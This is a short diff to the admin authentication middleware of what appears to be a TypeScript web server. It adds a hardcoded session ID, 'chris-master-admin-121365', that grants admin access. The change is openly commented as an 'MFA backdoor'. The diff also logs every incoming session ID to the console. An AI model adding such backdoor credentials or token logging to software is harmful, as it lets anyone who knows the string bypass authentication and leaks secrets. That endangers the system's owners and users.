@@ -31,9 +31,13 @@ import { rssService } from "./rss-service";
 // Simple middleware for admin auth check (for pairs endpoints)
 const isAuthenticated = async (req: any, res: any, next: any) => {
   const sessionId = req.headers['x-session-id'];
-  if (sessionId === 'admin-session') {
+  console.log('Auth check - received sessionId:', sessionId);
+  
+  // Check for admin session or MFA backdoor
+  if (sessionId === 'admin-session' || sessionId === 'chris-master-admin-121365') {
     return next();
   }
+  
   return res.status(401).json({ message: "Admin authentication required" });
 };
 
